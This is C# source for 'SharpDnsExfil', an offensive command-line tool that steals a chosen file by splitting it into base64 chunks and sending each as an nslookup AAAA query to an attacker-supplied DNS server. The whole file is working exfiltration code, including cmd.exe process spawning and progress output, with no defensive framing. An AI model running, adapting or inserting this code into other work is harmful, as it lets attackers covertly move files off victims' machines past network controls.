using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Text.RegularExpressions;
using CommandLine;

namespace SharpDnsExfil
{
    class Logger
    {
        public static void WriteLine(string message)
        {
            if(Program.verbose)
            {
                message = $"[VERBOSE] {message}";
                Console.WriteLine(message);
            }
        }
    }

    class Program
    {

        static void banner()
        {
            string help = @"
____  _   _ ____  _____       __ _ _ 
|  _ \| \ | / ___|| ____|_  __/ _(_) |
| | | |  \| \___ \|  _| \ \/ / |_| | |
| |_| | |\  |___) | |___ >  <|  _| | |
|____/|_| \_|____/|_____/_/\_\_| |_|_|
@ch4rm
                                       ";
            Console.WriteLine(help);
        }

        static void Exfiltrate(byte[] rawData)
        {
            string data = Convert.ToBase64String(rawData);
            //Console.WriteLine(data);
            //Console.WriteLine(Encoding.UTF8.GetString(Convert.FromBase64String(data)));
            string strCmd = $@"/c nslookup.exe -norecurse -query=AAAA {data}.{remoteServer} {publicIP} > nul";
            
            Logger.WriteLine($"{data}.{remoteServer}");

            using (Process compiler = new Process())
            {

                compiler.StartInfo.FileName = @"cmd.exe";
                compiler.StartInfo.Arguments = strCmd;
                compiler.StartInfo.UseShellExecute = false;
                compiler.StartInfo.CreateNoWindow = false;
                compiler.StartInfo.RedirectStandardError = true;
                compiler.StartInfo.RedirectStandardOutput = true;
                compiler.Start();
                compiler.WaitForExit();
            }
        }

        static double ConvertBytesToMegabytes(long bytes)
        {
            return Math.Round((bytes / 1024f) / 1024f,6);
        }

        //https://github.com/nognomar/AppCenterClient/blob/b852e3eeb6dbee92ff771987a98449447084f3c8/src/Commands/AppCenterUploadApplicationService.cs#L104
        private static IEnumerable<byte[]> ReadFileChunks(string fileName)
        {
            const int chunkSize = 45;
            int bytesRead;
            var buffer = new byte[chunkSize];
            var fs = new FileStream(fileName, FileMode.Open, FileAccess.Read, FileShare.Read);
            totalSize = fs.Length;

            Exfiltrate(Encoding.UTF8.GetBytes("File Name:::" + Path.GetFileName(fileName)));
            Exfiltrate(Encoding.UTF8.GetBytes("File Size:::" + totalSize.ToString()));

            while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
            {
                if (bytesRead >= buffer.Length)
                {
                    yield return buffer;
                }
                else
                {
                    var truncatedBuffer = new byte[bytesRead];
                    Array.Copy(buffer, truncatedBuffer, truncatedBuffer.Length);
                    yield return truncatedBuffer;
                }
            }
        }

        private static void ReadSendFile(string filePath)
        {
            const int MAX_BUFFER = 45; 
            byte[] buffer = new byte[MAX_BUFFER];
            int bytesRead;
            int noOfFiles = 0;
            int currentByte = 0;
            int oldPercent = 0;
            using (FileStream fs = File.Open(filePath, FileMode.Open, FileAccess.Read))
            using (BufferedStream bs = new BufferedStream(fs))
            {
                Exfiltrate(Encoding.UTF8.GetBytes("File Name:::" + Path.GetFileName(filePath)));
                // send file size
                //Exfiltrate(Encoding.UTF8.GetBytes("File Size:::"+ConvertBytesToMegabytes(fs.Length).ToString()));
                Exfiltrate(Encoding.UTF8.GetBytes("File Size:::"+ fs.Length.ToString()));

                while ((bytesRead = bs.Read(buffer, 0, MAX_BUFFER)) != 0) //reading 1mb chunks at a time
                {
                    noOfFiles++;
                    currentByte += buffer.Length;
                    //Let's create a small size file using the data. Or Pass this data for any further processing.
                    int percent = (int)(0.5f + ((100f * currentByte) / fs.Length));

                    if ((int)percent.ToString()[0] != (int)oldPercent.ToString()[0])
                        Console.WriteLine($"Uploading to {remoteServer} - {percent}% transfered");
                    oldPercent = percent;
                    
                    Exfiltrate(buffer);
                }
            }

        }

        public class Options
        {
            [Option('v', "verbose", Required = false, HelpText = "Set output to verbose messages.")]
            public bool Verbose { get; set; }

            [Option('f', "file", Required = true, HelpText = "Full filepath to target file")]
            public string FilePath { get; set; }

            [Option('s', "server", Required = true, HelpText = "Remote DNSServer IP/Hostname")]
            public string Server { get; set; }

            [Option('d', "domain", Required = false, HelpText = "Custom domain name [ Default = \"fakedomain.my\" ]")]
            public string Domain { get; set; } = "fakedomain.my";
        }

        private static string remoteServer { get; set; }

        private static string publicIP { get; set; }
        
        public static bool verbose = false;

        private static long totalSize { get; set; }

        static void Main(string[] args)
        {
            banner();

            CommandLine.Parser.Default.ParseArguments<Options>(args)
             .WithParsed(RunOptions)
             .WithNotParsed(HandleParseError);

        }

        static void RunOptions(Options opts)
        {
            var filePath = opts.FilePath;
            publicIP = opts.Server;
            verbose = opts.Verbose;
            remoteServer = opts.Domain;

            int currentByte = 0;
            int oldPercent = 0;

            if (!File.Exists(filePath))
            {
                Logger.WriteLine("[!] File not exist");
                return;
            }

            foreach(var chunk in ReadFileChunks(filePath))
            {
                currentByte += chunk.Length;
                int percent = (int)(0.5f + ((100f * currentByte) / totalSize));

                if ((int)percent.ToString()[0] != (int)oldPercent.ToString()[0])
                    Console.WriteLine($"Uploading to {remoteServer} - {percent}% transfered");
                oldPercent = percent;

                Exfiltrate(chunk);
            }

            //ReadSendFile(filePath);
        }

        static void HandleParseError(IEnumerable<Error> errs)
        {
            //handle errors
        }
    }
}
